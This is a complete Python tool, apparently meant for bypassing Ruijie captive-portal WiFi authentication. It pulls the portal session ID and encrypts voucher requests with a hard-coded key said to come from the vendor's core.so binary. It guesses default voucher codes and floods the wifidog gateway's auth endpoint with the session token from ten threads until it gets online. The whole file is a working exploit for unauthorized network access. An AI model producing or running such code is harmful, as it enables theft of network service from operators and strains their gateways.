#!/usr/bin/env python3
"""
Ruijie WiFi Portal Tool
Encrypted auth using RenderSecretKey (from core.so) + wifidog keepalive.
"""

import argparse
import base64
import hashlib
import json
import logging
import os
import re
import signal
import sys
import threading
import time
from urllib.parse import urljoin, urlparse, parse_qs, unquote

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HAS_CRYPTO = False
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    HAS_CRYPTO = True
except ImportError:
    pass

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("ruijie")

BANNER = r"""
  _____  _    _ _____       _ _____ ______
 |  _  /| |  | | | |   _   | | | | |  __|
 |  __ \| |  | |_   _|     | |_   _|  ____|
 | | \ \| |__| |_| |_ | |__| |_| |_| |____
 | |__) | |  | | | |       | | | | | |__
 |_|  \_\____/|_____| \____/|_____|______|
"""

RENDER_KEY = hashlib.md5(b"RenderSecretKey2026!@#").digest()


def aes_encrypt(plaintext: str) -> str:
    iv = os.urandom(16)
    cipher = AES.new(RENDER_KEY, AES.MODE_CBC, iv=iv)
    ct = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return base64.urlsafe_b64encode(iv + ct).decode()


def chap_md5(chap_id: str, password: str, challenge: str) -> str:
    return hashlib.md5(chap_id.encode() + password.encode() + challenge.encode()).hexdigest()


def parse_octal(s: str) -> bytes:
    out = bytearray()
    i = 0
    while i < len(s):
        if s[i] == '\\' and i + 3 < len(s) and s[i+1:i+4].isdigit():
            out.append(int(s[i+1:i+4], 8))
            i += 4
        else:
            out.append(ord(s[i]))
            i += 1
    return bytes(out)


def check_internet():
    try:
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=3, allow_redirects=False)
        return r.status_code == 204
    except Exception:
        return False


def find_sid(sess):
    r = sess.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
    if r.status_code == 204:
        return None, None, {}
    portal_url = r.url
    parsed = urlparse(portal_url)
    host = f"{parsed.scheme}://{parsed.netloc}"

    qs = parse_qs(urlparse(portal_url).query)
    gw_info = {k: v[0] for k, v in qs.items()}

    current = portal_url
    for _ in range(10):
        r = sess.get(current, verify=False, timeout=10)
        html = r.text
        current = str(r.url)
        sid = parse_qs(urlparse(current).query).get("sessionId", [None])[0]
        if sid:
            return sid, host, gw_info
        sid = re.search(r"sessionId=([a-f0-9]{32})", html)
        if sid:
            return sid.group(1), host, gw_info
        m = re.search(r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\']?\d+;?\s*url=([^"\' >]+)', html, re.I)
        if m:
            current = urljoin(current, m.group(1))
            continue
        m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", html)
        if m:
            current = urljoin(current, m.group(1))
            continue
        break
    return None, None, {}


def ping_loop(url, sess):
    while True:
        try:
            sess.get(url, timeout=5)
        except Exception:
            break
        time.sleep(0.05)


def run(threads=10, password=""):
    if not HAS_CRYPTO:
        log.warning("pycryptodome not installed! Install: pip install pycryptodome")
    log.info("Starting...")

    while True:
        sess = requests.Session()
        sess.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        sess.verify = False

        try:
            sid, host, gw = find_sid(sess)
            if not sid:
                time.sleep(3)
                sess.close()
                continue

            gw_addr = gw.get("gw_address", "192.168.110.1")
            gw_port = gw.get("gw_port", "2060")
            mac = gw.get("mac", "")
            client_ip = gw.get("ip", "")
            chap_id = unquote(gw.get("chap_id", ""))
            chap_chal = unquote(gw.get("chap_challenge", ""))

            log.info(f"[*] SID: {sid} | GW: {gw_addr}:{gw_port}")

            # Try voucher API with encrypted data (CryptoJS-compatible)
            voucher_api = f"{host}/api/auth/voucher/?lang=en_US"
            codes = [password] if password else ["123456", "000000", "111111"]

            for code in codes:
                try:
                    # Build payload like the binary's arrange_data
                    payload = {
                        "sessionId": sid,
                        "accessCode": code,
                        "apiVersion": 1,
                    }
                    if chap_id and chap_chal:
                        ch = parse_octal(chap_chal).hex()
                        pwd = chap_md5(chap_id, code, ch)
                        payload["password"] = pwd
                        payload["chap_id"] = chap_id
                        payload["chap_challenge"] = ch

                    if HAS_CRYPTO:
                        encrypted = aes_encrypt(json.dumps(payload))
                        r = sess.post(voucher_api, json={"data": encrypted}, timeout=5)
                        js = r.json()
                        if js.get("success") or js.get("status") == "ok":
                            log.info(f"[+] Encrypted auth OK! code={code}")
                            break
                        log.info(f"  Encrypted {code}: {js.get('message','?')[:40]}")
                except Exception as e:
                    log.debug(f"  Encrypt error: {e}")

            # Start wifidog pings
            auth_url = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
            try:
                sess.get(auth_url, timeout=5)
                sess.get(f"http://{gw_addr}:{gw_port}/wifidog/portal", timeout=5)
            except Exception:
                pass

            log.info(f"[*] Pinging {gw_addr}:{gw_port} ({threads}x threads)...")
            for _ in range(threads):
                threading.Thread(target=ping_loop, args=(auth_url, sess), daemon=True).start()

            time.sleep(12)
            log.info("[*] Verifying...")
            for i in range(25):
                if check_internet():
                    log.info("[+] ONLINE!")
                    while check_internet():
                        time.sleep(5)
                    log.warning("[-] Disconnected")
                    break
                time.sleep(2)
            else:
                log.warning("[-] Not online, retrying...")

            sess.close()
            time.sleep(3)

        except KeyboardInterrupt:
            log.info("Stopped")
            break
        except Exception as e:
            log.warning(f"[!] {e}")
            sess.close()
            time.sleep(5)


def main():
    print(BANNER)
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--threads", type=int, default=10)
    parser.add_argument("-c", "--code", type=str, default="", help="Known voucher code")
    args = parser.parse_args()
    signal.signal(signal.SIGINT, lambda s, f: (log.info("Stopped"), sys.exit(0)))
    run(threads=args.threads, password=args.code)


if __name__ == "__main__":
    main()
